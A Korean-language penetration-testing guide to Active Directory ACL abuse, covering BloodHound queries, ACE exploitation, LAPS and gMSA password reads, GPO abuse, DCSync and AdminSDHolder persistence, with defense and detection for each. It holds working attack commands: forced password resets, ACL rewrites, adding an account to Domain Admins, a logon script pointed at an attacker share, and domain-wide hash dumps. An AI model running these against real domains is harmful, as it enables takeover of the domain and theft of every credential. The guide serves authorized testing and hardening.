---
title: "AD 심화 — ACL 권한 체인과 DCSync 완성"
description: "BloodHound CE로 찾는 AD 객체별 ACL 악용 경로와 LAPS·gMSA·GPO·DCSync·AdminSDHolder까지 ACL 중심 권한 상승 체인을 조건·명령·방어·탐지로 정리합니다."
tags:
  - ActiveDirectory
  - BloodHound
  - ACL
  - DCSync
  - LAPS
  - gMSA
  - 하드닝
  - OSCP
---

> [!warning] 허가된 환경에서만 실습하세요
> ACL 공격은 **AD 객체의 ACE를 실제로 바꾼 다음 원복**하는 흐름이라 **중간에
> 작업이 끊기면 운영 권한 모델이 영구히 뒤틀립니다**. DCSync는 **모든 사용자
> 비밀번호 해시**를 복제로 가져오므로 그 자체가 **비밀번호 전수 교체 사유**에
> 해당합니다. 랩이 아닌 환경에서는 **"무엇을 바꿨는지 · 언제 되돌릴 것인지 ·
> 원복 명령은 무엇인지"**를 교전 시작 전 합의하고, 바꾼 모든 ACE와 발급·추출
> 받은 자격증명을 보고서에 적으세요.

> [!summary] ⏱️ 5초 핵심 요약
> - **한 줄 비유**: AD 객체의 ACL은 **"서랍마다 붙은 결재 라인"**입니다. 전역
>   관리자가 아니어도 **특정 서랍 한 칸에 "누구나 열쇠 교체 가능"이라는 도장**
>   하나만 찍혀 있으면, 공격자는 그 서랍 안의 "집무실 열쇠(비밀번호)"를 바꿔
>   차고 들어갑니다. DCSync는 그 중 **"열쇠 보관소의 모든 열쇠 복제 권한"**에
>   해당합니다.
> - **핵심 원리**: 공격은 ① **객체별 ACE**(GenericAll, WriteDACL, WriteOwner,
>   ForceChangePassword, AddKeyCredentialLink 등)와 ② **객체 유형별로 ACE가
>   주는 실권**(User → 비밀번호·Shadow Credentials, Group → 멤버 추가,
>   Computer → RBCD·LAPS, GPO → 코드 실행, Domain → DCSync) 의 조합입니다.
>   BloodHound는 이 조합을 **그래프의 엣지**로 계산해 경로 하나로 보여줍니다.
> - **놓치기 쉬운 곳**: ① **상속**으로 들어온 ACE(OU·AdminSDHolder) ② **원복
>   누락**(ACE/비밀번호/멤버십). ③ **AdminSDHolder SDProp 60분 주기** — 공격자가
>   보호 그룹에 넣은 변경이 60분 뒤 그대로 상속됩니다. ④ 신 LAPS(2023)의
>   `msLAPS-Password` / `msLAPS-EncryptedPassword` **vs** 레거시
>   `ms-Mcs-AdmPwd`.
> - **근본 조치**: **Tier 모델 + 민감 ACL 감사(5136/4662) + Protected Users
>   + AdminSDHolder 감시 + Just-in-Time(JIT) 관리 + LAPS 접근 분리 + GPO
>   변경 감사**. "최소 권한"은 지향이 아니라 **매주 엄격히 재검토해야 하는
>   운영 작업**입니다.

[[AD 심화 — Kerberos 티켓 위조와 위임 공격 완성|Kerberos 티켓 위조·위임]]
에서는 **키/티켓** 자체를 쥐는 공격을 다뤘고, [[AD 심화 — 강제 인증과
릴레이의 이해와 방어|강제 인증·릴레이]]에서는 **인증을 가로채는** 경로를,
[[AD 심화 — AD CS 인증서 공격 전수 정리|AD CS 공격 전수]]에서는 **인증서
발급 파이프라인**을 다뤘습니다. 이 글은 **그 모든 체인의 "전제 조건"이
되는 ACL 쓰기 ACE 자체를 어떻게 발견·악용·원복·방어하는지** 정리합니다.
AD 기본 구조(DACL, AdminSDHolder, SYSVOL)는
[[공격 체인 이전의 AD 아키텍처 기초 — Kerberos, NTLM, DACL·ACE, GPO·SYSVOL, 도메인 트러스트|AD 아키텍처 기초]]를 참고하세요.

모든 명령은 플레이스홀더(`<domain>`, `<dc>`, `<user>`)로 일반화했고 예시
도메인은 `corp.local`, IP는 `10.0.0.0/24` 사설입니다. 이 PC에서는 도메인
랩을 돌릴 수 없어 **도구 옵션·문법은 공식 README·KB 기준으로 썼고 실행
결과 자체는 미검증**입니다. certipy·bloodhound CE·impacket은 버전별 옵션
명칭 차이 가능성이 있으므로 **`-h`로 재확인**하세요. 재현은 "실습 환경"
절의 공개 랩에서 하세요.

---

## 한눈에 보는 ACL 공격 요약표

| 기법 | 필요 조건 | 얻는 것 | 끊어야 할 방어 지점 |
|---|---|---|---|
| **GenericAll (User)** | 피해 User 객체 전체 쓰기 | 비밀번호 재설정, Shadow Credentials, SPN 추가 | 보호 그룹·Protected Users, ACE 최소화 |
| **GenericWrite (User)** | 피해 User 속성 쓰기 | SPN 추가(Targeted Kerberoast), logon script 변조 | `servicePrincipalName` 쓰기 ACE 분리 |
| **WriteDacl** | 피해 객체 ACL 자체 수정 | 임의 ACE 추가 → 체인 재시작 | ACL 변경 감사(이벤트 5136) |
| **WriteOwner** | 피해 객체 소유자 변경 | 소유자로서 WriteDACL 획득 | Owner Rights · 감사 |
| **ForceChangePassword** | `User-Force-Change-Password` 확장권 | **이전 비밀번호 몰라도** 재설정 | 비밀번호 재설정 ACL 감사, Protected Users |
| **AddSelf / AddMember (Group)** | 그룹 Member 속성 쓰기 또는 Self-Membership 확장권 | 특권 그룹 자가 추가 | 보호 그룹(`adminCount=1`) |
| **AllExtendedRights** | 모든 확장권 포함 | DCSync, ForceChangePassword 등 전체 | Tier-0 ACE 분리 |
| **WriteProperty(특정 속성)** | 속성별 쓰기 ACE | 속성별 전용 공격(아래) | 속성별 ACE 리뷰 |
| **AddKeyCredentialLink** | `msDS-KeyCredentialLink` 쓰기 | Shadow Credentials → PKINIT | Key Admins 그룹만 허용 |
| **ReadLAPSPassword** | `ms-Mcs-AdmPwd` 또는 `msLAPS-Password` 읽기 | LAPS 평문 암호 | LAPS 접근 ACE 최소화 |
| **ReadGMSAPassword** | `msDS-ManagedPassword` 읽기 | gMSA 현재 NT 해시 | `msDS-GroupMSAMembership` 최소화 |
| **GPO Modify** | GPC Write + GPT SYSVOL 쓰기 | 링크된 OU 전체 코드 실행 | GPO 변경 감사, 생성/링크 분리 |
| **DCSync** | 도메인 객체의 `Replicating Directory Changes` + `...All` | 모든 계정 NT/krbtgt 해시 | 복제권 감사, 원본 ACE 상시 모니터 |

> [!important] ACL은 "숫자"가 아니라 "체인"으로 보세요
> `GenericAll` 하나만으로는 사실상 아무것도 아닙니다. 중요한 건
> **그 ACE가 어떤 객체 유형에 붙어있느냐**입니다. User의 GenericAll은
> 비밀번호·Shadow Credentials·SPN 전체를 뜻하고, Computer의 GenericAll은
> RBCD·LAPS·Shadow Credentials를 뜻하며, GPO의 GenericWrite는 **링크된
> OU 전원의 로컬 SYSTEM**입니다. **BloodHound가 하는 일은 바로 이 "객체
> 유형별 ACE의 실효 권한"을 자동 계산해 그래프로 보여주는 것**입니다.

---

## 1. BloodHound CE — 수집부터 경로 질의까지

### 1.1 수집(Collection)

**Windows 측 — SharpHound**:

```powershell
# 도메인 사용자로 전체 수집
.\SharpHound.exe -c All -d corp.local --zipfilename corp.zip

# 순화된 세션 수집 (로컬 관리자 오남용 회피)
.\SharpHound.exe -c Group,LocalGroup,Session,ACL,Trusts -d corp.local
```

**Linux 측 — bloodhound-python**:

```bash
bloodhound-python -u <user> -p '<pw>' -d corp.local \
  -ns 10.0.0.10 -c All --zip

# NTLM 비활성 환경 — Kerberos
bloodhound-python -u <user> -k -no-pass -d corp.local \
  -ns 10.0.0.10 -c All --zip
```

| `-c` 컬렉션 | 뜻 |
|---|---|
| `Group` | 그룹·멤버 관계 |
| `LocalAdmin` / `LocalGroup` | 각 호스트의 로컬 관리자·그룹 |
| `Session` | 로그온 세션 — "어떤 사용자가 어떤 호스트에 떠 있는가" |
| `ACL` | 핵심. 모든 객체 ACE |
| `Trusts` | 도메인·Forest 트러스트 |
| `GPOLocalGroup` | GPO로 설정된 로컬 그룹 멤버 |
| `All` | 위 전부 |

**AD CS 데이터**는 `certipy find -bloodhound`로 별도 생성해 함께 업로드.
자세한 흐름은 [[AD 심화 — AD CS 인증서 공격 전수 정리|AD CS 글]] 참고.

### 1.2 BloodHound CE의 구조

BloodHound CE(Community Edition)는 **Neo4j + 웹 UI + REST API** 구조입니다.
업로드한 수집 결과는 그래프에 저장되고, **Cypher 쿼리**로 임의 경로를
탐색할 수 있습니다. "Shortest Paths to Domain Admins"는 기본 질의이지만
실전에서는 **사용자별·그룹별·호스트별 맞춤 질의**가 더 중요합니다.

### 1.3 자주 쓰는 Cypher 질의

```cypher
// 1) 현재 공격자 → Domain Admins 최단 경로
MATCH p=shortestPath(
  (a:User {name:'ATTACKER@CORP.LOCAL'})-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})
)
RETURN p

// 2) Kerberoastable + 공격자가 ACL로 도달 가능
MATCH p=allShortestPaths(
  (a {name:'ATTACKER@CORP.LOCAL'})-[*1..]->(u:User {hasspn:true})
)
RETURN p LIMIT 25

// 3) 공격자가 어떤 User/Computer의 ACL을 바꿀 수 있는지
MATCH p=(a {name:'ATTACKER@CORP.LOCAL'})-[:WriteDacl|WriteOwner|GenericAll|GenericWrite]->(t)
RETURN p LIMIT 50

// 4) Shadow Credentials 가능 대상
MATCH p=(a {name:'ATTACKER@CORP.LOCAL'})-[:AddKeyCredentialLink|GenericAll|GenericWrite|Owns]->(t)
RETURN p LIMIT 50

// 5) LAPS 비밀번호 읽기 가능
MATCH p=(a {name:'ATTACKER@CORP.LOCAL'})-[:ReadLAPSPassword]->(c:Computer)
RETURN p LIMIT 50

// 6) RBCD (AllowedToAct) edge
MATCH p=(a)-[:AddAllowedToAct]->(c:Computer)
WHERE a.name = 'ATTACKER@CORP.LOCAL'
RETURN p
```

> [!important] "경로가 길면 안전"이 아닙니다
> BloodHound 경로는 **엣지 수가 아니라 "엣지의 비용"으로 가중**됩니다.
> 10단계여도 각 단계가 자동화되면 **오후 한 번에 끝납니다**. 공격 경로
> 수와 "첫 번째 엣지의 공격자 수"를 함께 봐야 합니다.

- 출처: [SpecterOps — BloodHound CE 공식 문서](https://support.bloodhoundenterprise.io/), [BloodHound-Legacy README](https://github.com/BloodHoundAD/BloodHound), [SharpHound README](https://github.com/BloodHoundAD/SharpHound)

---

## 2. ACE별 악용 — 어떤 쓰기가 무엇을 주나

### 2.1 GenericAll

**원리**: 모든 ACE를 포함하는 ACL. 객체 전체 쓰기 + 모든 확장권.
User 대상이면 비밀번호 재설정부터 KeyCredentialLink 추가까지 가능.

**명령 (예: User 대상 비밀번호 재설정)**:

```bash
impacket-changepasswd corp.local/<attacker>:'<pw>'@<dc> \
  -newpass 'Pwn3dPassw0rd!' -altuser '<victim>' \
  -reset -k -no-pass  # Kerberos 환경에서는 -k

# 또는 net rpc
net rpc password '<victim>' 'Pwn3dPassw0rd!' -U '<attacker>%<pw>' -S <dc>
```

**원복**: 반드시 원 비밀번호(없으면 랜덤 긴 문자열) 재설정 후 교전 종료
전 비밀번호 관리자에게 통지. **Protected Users 그룹 사용자는 재설정이
실패**할 수 있음(정책 종속).

### 2.2 GenericWrite

**원리**: 대상 객체의 속성 쓰기. 비밀번호 재설정은 **불가**(별도 확장권
필요)지만 아래 변종이 가능.

**Targeted Kerberoast (SPN 추가)**:

```bash
impacket-targetedKerberoast.py -u <attacker>@corp.local -p '<pw>' \
  -d corp.local
# 또는 Rubeus (Windows)
.\Rubeus.exe kerberoast /user:<victim> /spn:dummy/host
```

**Logon Script 변조** (User 객체의 `scriptPath` 쓰기):

```powershell
Set-ADUser <victim> -ScriptPath '\\attacker\share\run.cmd'
```

### 2.3 WriteDacl

**원리**: 객체의 **ACL 자체**를 쓸 수 있음. 공격자는 자신에게
`GenericAll` ACE를 추가한 뒤 체인을 재시작.

**명령 (impacket `dacledit.py`)**:

```bash
impacket-dacledit.py -action write \
  -rights FullControl -principal <attacker> \
  -target <victim> \
  corp.local/<attacker>:'<pw>' -dc-ip 10.0.0.10

# 공격 종료 후 원복
impacket-dacledit.py -action remove \
  -rights FullControl -principal <attacker> \
  -target <victim> \
  corp.local/<attacker>:'<pw>' -dc-ip 10.0.0.10
```

`dacledit.py`가 없는 구버전 impacket에선 `ldapdomaindump` + 수동 LDAP
modify 또는 PowerView `Add-DomainObjectAcl`.

### 2.4 WriteOwner

**원리**: 소유자 변경 권한. 소유자는 암묵적으로 WriteDACL 을 가지므로
**공격자 → 소유자 → WriteDACL → GenericAll → 임의 공격** 흐름.

```bash
impacket-owneredit.py -action write -new-owner <attacker> \
  -target <victim> \
  corp.local/<attacker>:'<pw>' -dc-ip 10.0.0.10
```

Windows의 **"Owner Rights" SID** 설정이 ACL에 없다면 Owner는 자동으로
WriteDACL을 가집니다. 원복 시 **원 소유자**로 반드시 복원.

### 2.5 ForceChangePassword

**원리**: `User-Force-Change-Password` 확장권(`00299570-246d-11d0-a768-
00aa006e0529`). **이전 비밀번호 없이** 재설정할 수 있는 ACE. 일반적으로
Help Desk 그룹에 부여되지만 **"Account Operators"** 가 부적절하게 넓게
위임된 환경에서 자주 보임.

**명령**: §2.1과 동일(`impacket-changepasswd` 또는 `net rpc password`).

### 2.6 AddSelf / AddMember (Group)

**원리**: 그룹의 `Member` 속성을 쓸 수 있거나, `Self-Membership` 확장권
(`bf9679c0-...`) 이 있으면 자기 자신을 그룹에 추가 가능. 특권 그룹에
자가 추가되면 그 그룹 권한 획득.

```bash
impacket-net group <priv-group> -add <attacker> \
  corp.local/<attacker>:'<pw>' -dc-ip 10.0.0.10
# impacket-net.py는 최신 버전에 있음. 구버전은 ldapmodify 또는 PowerView.

# PowerView (Windows)
Add-DomainGroupMember -Identity 'Domain Admins' -Members '<attacker>'
```

**원복 필수**:

```powershell
Remove-DomainGroupMember -Identity 'Domain Admins' -Members '<attacker>'
```

### 2.7 AllExtendedRights

**원리**: 모든 확장권을 포함. User 객체면 ForceChangePassword, Computer
면 RBCD, Domain 객체면 DCSync 등 **객체별로 다른 확장권이 활성화**됨.

### 2.8 WriteProperty(특정 속성) — 속성별 전용 공격 사전

| 속성 | 쓰기 시 공격 |
|---|---|
| `servicePrincipalName` | Targeted Kerberoast (§2.2) |
| `msDS-KeyCredentialLink` | Shadow Credentials (§3) |
| `msDS-AllowedToActOnBehalfOfOtherIdentity` | RBCD |
| `msDS-AllowedToDelegateTo` | Constrained Delegation |
| `userAccountControl` | `DONT_REQ_PREAUTH` 토글 → AS-REP Roast; `TRUSTED_FOR_DELEGATION` 토글 → Unconstrained |
| `scriptPath` / `logonScript` | 로그온 스크립트 변조 |
| `profilePath` / `homeDirectory` | 로그온 시 UNC 접근으로 Net-NTLMv2 수집 |
| `altSecurityIdentities` | ESC14 (임의 인증서 매핑) |

- 출처: [SpecterOps — Abusing Active Directory DACLs/ACEs](https://posts.specterops.io/an-ace-up-the-sleeve-designing-active-directory-dacl-backdoors-5c7fd3f7f38), [harmj0y — ACL 공격 사전](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon), [impacket dacledit/owneredit](https://github.com/fortra/impacket)

---

## 3. 객체 유형별 차이 — 같은 ACE가 다르게 작동한다

### 3.1 User 객체

- **ForceChangePassword** → 비밀번호 재설정 후 바로 Kerberos 로그인
- **AddKeyCredentialLink** → Shadow Credentials → PKINIT → NT 해시
  (certipy shadow, [[AD 심화 — AD CS 인증서 공격 전수 정리|AD CS 글]] §4
  참조)
- **WriteSPN** → Targeted Kerberoast
- **WriteUAC** → `DONT_REQ_PREAUTH` → AS-REP Roast

### 3.2 Group 객체

- **AddMember / AddSelf** → 그룹 권한 획득
- **GenericWrite on Group** → `Member` 쓰기 가능
- **"보호 그룹"**(Domain Admins, Account Operators 등 `adminCount=1`)은
  AdminSDHolder SDProp이 60분 주기로 ACL을 복원하므로 단순 멤버 추가
  외의 영속 백도어가 어렵다 — 단, **멤버 추가 자체는 60분 내 유지**되고
  그 사이 다른 공격을 완료할 수 있음

### 3.3 Computer 객체

- **GenericAll** → RBCD(§5.3 Kerberos 글 참고) + LAPS 읽기 + Shadow
  Credentials
- **AddAllowedToAct** → RBCD 전용 edge
- **WriteLAPSPassword** 는 보통 존재하지 않음. 공격은 **ReadLAPSPassword**
  방향

### 3.4 GPO 객체

- **GenericWrite on GPO** → GPT(SYSVOL) 쓰기 + GPC 수정 → 링크된 OU의
  **모든 호스트**에서 로컬 SYSTEM (즉시 예약 작업, 로그온 스크립트)
- SpecterOps의 pyGPOAbuse / SharpGPOAbuse 가 **"즉시 예약 작업 추가 →
  GPO 버전 번호 증가 → 피해 호스트가 다음 `gpupdate`에서 당긴다"** 흐름을
  자동화

### 3.5 OU 객체

- **GenericAll on OU** → 그 OU 하위 모든 객체에 대한 상속 쓰기 (단,
  각 자식 객체가 상속을 허용해야 함)
- OU의 **GPO 링크 수정**은 Create/Delete-Link 확장권 필요 — GenericAll
  로는 커버됨

### 3.6 Domain 객체 — DCSync

- **`DS-Replication-Get-Changes`** (GUID `1131f6aa-9c07-11d1-f79f-
  00c04fc2dcd2`) + **`DS-Replication-Get-Changes-All`** (GUID
  `1131f6ad-...`) 조합이 **DCSync 자격**
- Domain Admins·Enterprise Admins·Domain Controllers 가 기본 보유
- `AllExtendedRights` 는 이 둘을 포함하므로 Domain 객체의 AllExtendedRights
  를 가진 계정은 DCSync 가능

### 3.7 AdminSDHolder

- `CN=AdminSDHolder,CN=System,DC=corp,DC=local` 객체는 **"보호 그룹들의
  ACL 템플릿"**. 60분마다 SDProp 스레드가 템플릿을 보호 그룹 멤버들에게
  강제 상속
- 공격자가 AdminSDHolder 에 자신에게 유리한 ACE를 추가하면 **60분 이내
  모든 Tier-0 사용자에 그 ACE 가 적용**
- 운영 측면에서 가장 위험한 "지속성 포인트"

- 출처: [SpecterOps — 다양한 객체 유형별 edge 설명](https://support.bloodhoundenterprise.io/hc/en-us/articles/14257537540507), [Microsoft — AdminSDHolder & SDProp](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)

---

## 4. LAPS 비밀번호 읽기 — 레거시 vs 신 LAPS

### 4.1 두 가지 LAPS

| 제품 | 속성 | 등장 | 암호화 |
|---|---|---|---|
| **레거시 LAPS** (Microsoft LAPS, 별도 설치) | `ms-Mcs-AdmPwd`, `ms-Mcs-AdmPwdExpirationTime` | 2015+ | 평문 저장 (LDAP ACL로 보호) |
| **Windows LAPS** (내장, 2023+) | `msLAPS-Password`, `msLAPS-EncryptedPassword`, `msLAPS-PasswordExpirationTime` | 2023 (Windows Server 2019/22, Windows 10/11 업데이트 포함) | **DPAPI-NG 암호화** 가능 (Key Trust) |

**전환 중인 조직은 두 속성이 공존**하므로 공격자는 양쪽 다 조회합니다.

### 4.2 열거

```bash
# ldapsearch - 레거시 LAPS
ldapsearch -x -H ldap://10.0.0.10 -D '<attacker>@corp.local' \
  -w '<pw>' -b 'DC=corp,DC=local' \
  '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd sAMAccountName

# 신 LAPS
ldapsearch -x -H ldap://10.0.0.10 -D '<attacker>@corp.local' \
  -w '<pw>' -b 'DC=corp,DC=local' \
  '(|(msLAPS-Password=*)(msLAPS-EncryptedPassword=*))' \
  msLAPS-Password msLAPS-EncryptedPassword sAMAccountName
```

**impacket 기반**:

```bash
# 레거시
impacket-lapsdump -u <user> -p '<pw>' -d corp.local -ts 10.0.0.10

# 신 LAPS (Windows LAPS) — 2023 LAPS 전용 도구 사용
# NetExec (nxc)로 두 포맷 모두 지원
nxc ldap 10.0.0.10 -u <user> -p '<pw>' --laps
```

> [!note] 2023 LAPS 암호화(`msLAPS-EncryptedPassword`)
> Windows LAPS를 **Key Trust 암호화** 로 설정하면 비밀번호가
> `msLAPS-EncryptedPassword`에 저장되고 **DPAPI-NG 로 암호화**되어
> 원격 조회만으로는 평문을 얻지 못합니다. 복호화에는 설정된 **Key Admins
> 또는 머신 자체**의 개인키가 필요. 신 LAPS는 **"읽기 ACE를 받아도
> 평문이 아닐 수 있다"**는 점이 운영상 큰 변화입니다.

### 4.3 비밀번호 획득 후

로컬 관리자 비밀번호를 얻으면 바로 Pass-the-Password / wmiexec / smbexec:

```bash
impacket-wmiexec '<domain>/administrator:<laps-pw>@<target>'
# 또는 Pass-the-Hash 가능 (LAPS 비밀번호 자체를 NT 해시로 변환)
```

### 4.4 방어

- LAPS 읽기 ACE 를 **"로컬 관리자 비밀번호 조회가 필요한 운영자 그룹"**
  으로 최소화. 흔한 실수는 **"Domain Users 가 ms-Mcs-AdmPwd 읽기"** 가
  OU 전체로 상속된 경우
- Windows LAPS는 **Key Trust 암호화** 활성화로 추가 보호
- **Just-in-Time**: PAM(Privileged Access Management) 연동으로 **필요
  시점에만** 읽기 허용

### 4.5 탐지

- Event 4662 (DS Access)의 **`Property GUID`** 가 `ms-Mcs-AdmPwd` /
  `msLAPS-Password` 의 GUID 인 접근 감사
- 비정상적으로 다수 호스트의 LAPS 속성을 **짧은 시간에 읽는 세션** 탐지

- 출처: [Microsoft — Windows LAPS 개요](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview), [Microsoft — 레거시 LAPS](https://support.microsoft.com/en-us/topic/laps), [NetExec (nxc) README](https://github.com/Pennyw0rth/NetExec)

---

## 5. gMSA 비밀번호 추출

### 5.1 원리

Group Managed Service Account(gMSA)는 **DC가 자동으로 복잡한 비밀번호를
생성·주기적으로 교체**하고 `msDS-ManagedPassword` 속성에 **BLOB으로 저장**
합니다. 이 BLOB은 **`msDS-GroupMSAMembership`** 에 등록된 Principal 만
읽을 수 있습니다. 공격자가 그 Principal에 속하면 BLOB을 복호화해 현재
NT 해시를 얻습니다.

### 5.2 열거와 추출

```bash
# gMSADumper (Python)
python3 gMSADumper.py -u <user> -p '<pw>' -d corp.local

# impacket getKey (최신 버전)
impacket-getKey -u <user>@corp.local -p '<pw>' -d corp.local <gmsa-name>$

# NetExec
nxc ldap 10.0.0.10 -u <user> -p '<pw>' --gmsa
```

출력 예(개념):

```
gMSA Account: svc_sql$
 NT Hash: aabbcc...
 Current Key: aes256=...
 Previous Key: aes256=... (롤오버 기간 동안 유효)
```

### 5.3 활용

얻은 NT 해시로:

- Kerberos TGT 요청(`impacket-getTGT -hashes :<NT>`)
- Silver Ticket 발급 (gMSA 가 서비스 계정이므로 SPN 보유)
- RBCD의 "SPN 있는 계정" 역할 — gMSA 자체를 S4U 체인에 활용

### 5.4 방어

- `msDS-GroupMSAMembership` 에 **진짜 필요한 호스트만** 포함. 그룹에
  Domain Computers 같은 넓은 단위를 넣는 실수 금지
- gMSA 자체도 **고권한 그룹 멤버 금지** — 서비스 계정이 Domain Admins 라면
  gMSA 노출이 곧 DA 노출
- 교체 주기 기본 30일을 **더 짧게 조정**(가능한 경우)

### 5.5 탐지

- Event 4662 의 `Property GUID` 가 `msDS-ManagedPassword` 인 접근
- 비정상 Principal 이 gMSA 읽기 요청 → 계정·호스트 상관

- 출처: [Microsoft — Group Managed Service Accounts 개요](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), [gMSADumper 원본](https://github.com/micahvandeusen/gMSADumper), [impacket README](https://github.com/fortra/impacket)

---

## 6. GPO 남용 — 링크된 OU 전체 코드 실행

### 6.1 원리

GPO 수정 권한을 가진 사용자는 **GPC(AD 측)** 와 **GPT(SYSVOL 측)** 두
곳을 변경합니다. **Scheduled Tasks Preferences**, **Immediate Task**,
**Startup/Logon Script**, **Files/Registry Preferences** 를 끼워 넣으면
**해당 GPO가 링크된 OU 하위 모든 호스트의 다음 `gpupdate`** 에서 자동
실행됩니다. 즉시 작업(Immediate Task)은 **즉시 발동**합니다.

### 6.2 자동화 도구

**pyGPOAbuse (Linux)**:

```bash
python3 pygpoabuse.py corp.local/<user>:'<pw>' \
  -gpo-id '{31B2F340-016D-11D2-945F-00C04FB984F9}' \
  --command 'cmd /c net localgroup administrators <attacker> /add'
# 대상 GPO의 GUID는 "Group Policy Management"에서 확인하거나
# BloodHound로 GenericWrite on GPO 검색
```

**SharpGPOAbuse (Windows)**:

```powershell
.\SharpGPOAbuse.exe --AddComputerTask `
  --TaskName 'UpdateHelper' --Author 'CORP\admin' `
  --Command 'cmd.exe' `
  --Arguments '/c net localgroup administrators <attacker> /add' `
  --GPOName '<target-gpo>'
```

### 6.3 반드시 원복

GPO 공격은 **예약 작업과 GPT 파일**을 둘 다 남깁니다. 종료 시:

1. 원래 GPO 버전을 복원 (사전에 백업 필수)
2. GPT 디렉터리에서 추가한 파일 삭제
3. GPC 의 `versionNumber`, `gPCMachineExtensionNames` 복원

**복구 책임**은 공격자에게 있습니다. 잊으면 **운영 환경 전역에 반복 실행**
되는 작업이 남을 수 있음.

### 6.4 방어·탐지

- **GPO 생성·수정 권한 분리**: 생성 그룹(Group Policy Creator Owners)
  과 **링크 권한**(각 OU)을 별개로 유지
- Event **5136** (디렉터리 객체 변경) 에서 **GPC 변경 감사**
- SYSVOL 파일 서버 측 **파일 생성/수정 감사** (고가 IO지만 Tier-0 보호
  가치)
- Microsoft Defender for Identity의 "Suspicious GPO changes" 알림

- 출처: [SpecterOps — Abusing GPO Permissions](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e), [pyGPOAbuse 원본](https://github.com/Hackndo/pyGPOAbuse), [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

---

## 7. DCSync — 복제 권한으로 모든 비밀번호

### 7.1 원리

Domain Controller 간 복제 프로토콜(**DRSUAPI** `IDL_DRSGetNCChanges`)은
**모든 사용자의 자격증명(NT/AES, krbtgt 포함)**을 포함한 디렉터리 변경
세트를 전달합니다. 공격자가 그 복제권을 가진 Principal 이 되면 **"가짜
DC"처럼 DRSGetNCChanges 를 호출**해 모든 해시를 뽑아올 수 있습니다.

### 7.2 성립 조건

- 공격자 Principal 이 Domain 객체에 아래 **두 확장권** 보유 (또는
  `AllExtendedRights`):
  - `DS-Replication-Get-Changes` (`1131f6aa-...`)
  - `DS-Replication-Get-Changes-All` (`1131f6ad-...`)
- **일반적으로 Domain Admins / Enterprise Admins / Domain Controllers**
  가 보유. 공격자가 이 ACE 를 **ACL 공격으로 얻었다면** DA 멤버십 없이도
  가능

### 7.3 명령

```bash
# 모든 계정의 해시 덤프
impacket-secretsdump corp.local/<attacker>:'<pw>'@dc01.corp.local

# 특정 사용자만
impacket-secretsdump -just-dc-user administrator \
  corp.local/<attacker>:'<pw>'@dc01.corp.local

# krbtgt 만 (Golden Ticket 재료)
impacket-secretsdump -just-dc-user krbtgt \
  corp.local/<attacker>:'<pw>'@dc01.corp.local

# NTLM 해시만 (AES 키 제외)
impacket-secretsdump -just-dc-ntlm corp.local/<attacker>:'<pw>'@dc01.corp.local

# Kerberos (NTLM 비활성 환경)
export KRB5CCNAME=<attacker>.ccache
impacket-secretsdump -k -no-pass -dc-ip 10.0.0.10 \
  corp.local/<attacker>@dc01.corp.local
```

`-just-dc` / `-just-dc-user` / `-just-dc-ntlm` 는 **NTDS.dit 원격 처리
vs 복제 호출**을 섞어 쓰며, 공격 흔적 최소화·시간 단축에 중요합니다.

### 7.4 "DCSync 후" 흐름

- **krbtgt 해시** → [[AD 심화 — Kerberos 티켓 위조와 위임 공격 완성|
  Golden Ticket]]
- **각 머신 계정 해시** → Silver Ticket
- **사용자 해시** → Pass-the-Hash, 오프라인 크랙으로 평문 재확보
- **보고서 측면**: DCSync 를 한 교전은 **전사 비밀번호 리셋 대상**임을
  명시

### 7.5 흔적 복구

DCSync 자체는 **데이터를 가져올 뿐 ACL 을 영구 변경하지 않습니다**. 다만:

- 공격자가 **그 복제권을 얻기 위해 Domain 객체에 ACE 를 추가**했다면,
  반드시 **그 ACE 를 제거**
- 공격 중 **추가로 재설정한 비밀번호**(비밀번호 바꾼 계정)는 원 소유자에게
  재설정 통지
- 교전 종료 후 **krbtgt 2회 리셋**(24시간 간격) 및 **모든 서비스 계정
  비밀번호 교체**를 운영팀에 공식 요청

### 7.6 방어

- **Replicating Directory Changes/All** 확장권을 가진 Principal **전수
  리뷰**. Microsoft 권장은 "DA/EA/DC 외 추가 금지"
- 가능하면 DC 를 **Tier-0 네트워크 세그먼트**로 분리
- **Microsoft Defender for Identity**의 "Suspicious replication requests"
  경보

### 7.7 탐지

- Event **4662**: `Access Mask = 0x100`, `Properties` 에 `DS-Replication-
  Get-Changes-All` GUID 포함 — 정상적으로는 DC 간에만 나타나는 패턴.
  **일반 사용자/서버가 DC 로 요청**하면 DCSync 신호
- Windows 2016+ 에서 `Audit Directory Service Access` 하위 카테고리 활성
  필요

- 출처: [Microsoft — DRSUAPI 복제 권한](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/), [SpecterOps — DCSync 탐지](https://posts.specterops.io/mimikatz-dcsync-usage-exploitation-and-detection-1692d1b9faf5), [impacket secretsdump README](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

---

## 8. AdminSDHolder · SDProp 체인

### 8.1 구조

- **AdminSDHolder** 객체는 보호 그룹(Domain Admins, Enterprise Admins,
  Account Operators, Backup Operators 등 `adminCount=1`) 의 "ACL 템플릿"
- **SDProp** 스레드는 PDC Emulator FSMO 역할의 DC 에서 **기본 60분 주기**
  로 실행되어, 템플릿 ACL 을 보호 그룹 멤버에게 적용
- 멤버가 그룹에서 빠져도 `adminCount=1` 과 ACL 템플릿 상속은 남음
  ("stale admin" 현상)

### 8.2 공격

- 공격자가 AdminSDHolder 객체에 **GenericAll** 이나 **WriteDacl** 을
  얻으면, 자기 자신에게 Tier-0 ACL 을 **60분 이내 자동 상속**시킬 수 있음
- 심지어 **그룹 멤버십이 없어도** Tier-0 객체에 대한 ACE 로 영구 지속성
  확보

### 8.3 방어·탐지

- AdminSDHolder 자체의 ACL 은 **Domain Admins · Enterprise Admins ·
  System** 만 보유해야 정상
- Event **5136** (디렉터리 객체 변경)에서 `CN=AdminSDHolder` 쓰기 감사
- Event **4780** ("The ACL was set on accounts which are members of
  administrators groups") — SDProp 이 실행될 때 기록. 비정상 빈도는 변경
  신호

